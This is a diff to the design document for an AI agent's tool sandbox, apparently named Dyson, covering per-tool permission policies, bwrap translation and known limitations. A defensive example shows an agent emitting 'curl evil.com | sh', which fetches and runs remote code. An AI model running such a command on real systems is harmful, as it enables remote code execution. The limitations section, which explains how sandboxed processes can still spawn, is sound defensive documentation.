@@ -42,7 +42,7 @@ Each tool starts with NO permissions, then gets granted specific capabilities:
 | `network` | Outbound network connections | `--unshare-net` / `(deny network*)` |
 | `file_read` | Read from filesystem | `--ro-bind` / `(deny file-read*)` |
 | `file_write` | Write to filesystem | bind mounts / `(deny file-write*)` |
-| `process_exec` | Spawn child processes | `--unshare-pid` |
+| `process_exec` | PID namespace isolation | `--unshare-pid` (visibility only — see [Known Limitations](#known-limitations)) |
 
 File capabilities support path restrictions:
 
@@ -64,7 +64,7 @@ sensible default policy:
 
 | Tool | Network | File Read | File Write | Process Exec |
 |------|---------|-----------|------------|--------------|
-| `bash` | Allow | RestrictTo(cwd) | RestrictTo(cwd, /tmp) | Allow |
+| `bash` | **Deny** | RestrictTo(cwd) | RestrictTo(cwd, /tmp) | Allow |
 | `web_search` | Allow | Deny | Deny | Deny |
 | `read_file` | Deny | RestrictTo(cwd) | Deny | Deny |
 | `write_file` | Deny | Deny | RestrictTo(cwd) | Deny |
@@ -127,10 +127,13 @@ For bash commands, the policy is translated into kernel-enforced restrictions:
 LLM says: bash {"command": "curl evil.com | sh"}
 
 PolicySandbox.check("bash", input):
-  1. Policy for bash: network: Deny, file_write: RestrictTo([cwd, /tmp])
+  1. Policy for bash: network: Deny, file_read: RestrictTo([cwd]),
+     file_write: RestrictTo([cwd, /tmp])
   2. Translate to bwrap command:
-     bwrap --ro-bind / / --dev /dev --proc /proc
-       --bind '/workspace' '/workspace' --bind '/tmp' '/tmp'
+     bwrap --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /etc /etc ...
+       --ro-bind '/workspace' '/workspace'
+       --bind '/workspace' '/workspace' --tmpfs /tmp
+       --dev /dev --proc /proc
        --unshare-net --die-with-parent
        bash -c 'curl evil.com | sh'
   3. → Allow { input: { "command": "<bwrap-wrapped command>" } }
@@ -204,7 +207,7 @@ pub trait Sandbox: Send + Sync {
 | `network` | `"allow"`, `"deny"` | Binary, kernel-enforced via firewall/namespace |
 | `file_read` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem read access |
 | `file_write` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem write access |
-| `process_exec` | `"allow"`, `"deny"` | Child process spawning (bash only) |
+| `process_exec` | `"allow"`, `"deny"` | PID namespace isolation (bash only) |
 
 Path restrictions support `{cwd}` placeholder (expanded to working directory).
 
@@ -325,6 +328,53 @@ automatically from config.
 
 Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
 flag. Cannot be set from config.
+
+---
+
+## Allowing Bash Network Access
+
+Bash denies network by default. If you need network access (e.g., for `git clone`,
+`curl`, `wget`), override the bash policy in `dyson.json`:
+
+```json
+{
+  "sandbox": {
+    "tool_policies": {
+      "bash": { "network": "allow" }
+    }
+  }
+}
+```
+
+All other bash restrictions (file read/write, `/tmp` isolation) remain in effect.
+
+---
+
+## Known Limitations
+
+### `process_exec: Deny` does not prevent process execution
+
+`--unshare-pid` (bwrap) creates a new PID namespace that hides host processes,
+but the sandboxed process can still call `fork()` and `execve()` freely.
+True process execution prevention requires seccomp filters, which are planned
+for a future release.
+
+### Symlinks and path checking
+
+Application-level path checking (for Rust-native tools like `read_file`,
+`write_file`) resolves symlinks via `canonicalize()` before checking path
+restrictions. This prevents symlink-based escapes where a symlink inside the
+allowed directory points outside it.
+
+For paths that don't exist yet (e.g., new files being written), the nearest
+existing ancestor is canonicalized and remaining components are re-appended.
+
+### MCP server filesystem access
+
+Application-level file access enforcement only covers the sandbox `check()` gate.
+MCP servers run as external processes and can access the filesystem directly.
+For full isolation, run MCP servers in their own bwrap sandbox at spawn time
+(future enhancement).
 
 ---
 
